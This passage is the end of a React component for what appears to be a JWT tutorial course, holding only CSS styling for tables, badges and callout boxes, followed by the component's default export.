        .chapter-content .comp-table th{background:var(--bg4);border:1px solid var(--border);padding:7px 10px;color:var(--text);font-weight:700;text-align:left}
        .chapter-content .comp-table td{border:1px solid var(--border);padding:7px 10px;color:var(--text2)}
        .chapter-content .kw-table{width:100%;border-collapse:collapse;margin-bottom:.85rem;font-size:12px}
        .chapter-content .kw-table td:first-child{font-family:'Fira Code',monospace;font-size:11px;color:var(--cyan);background:var(--bg3);border:1px solid var(--border);padding:6px 10px;white-space:nowrap;width:30%}
        .chapter-content .kw-table td:last-child{border:1px solid var(--border);padding:6px 10px;color:var(--text2)}
        .chapter-content .divider{border:none;border-top:1px solid var(--border);margin:1.25rem 0}
        .chapter-content .badge{display:inline-block;font-size:10px;font-weight:700;padding:2px 8px;border-radius:20px;margin:2px;letter-spacing:.04em}
        .chapter-content .real-life{background:var(--purple-bg);border:1px solid var(--purple-border);border-radius:var(--radius);padding:1rem 1.25rem;margin-bottom:.85rem}
        .chapter-content .real-life-title{font-size:10px;font-weight:700;color:var(--purple);letter-spacing:.08em;text-transform:uppercase;margin-bottom:.5rem}
      `}</style>
    </div>
  );
};

export default JWTMasteryCourse;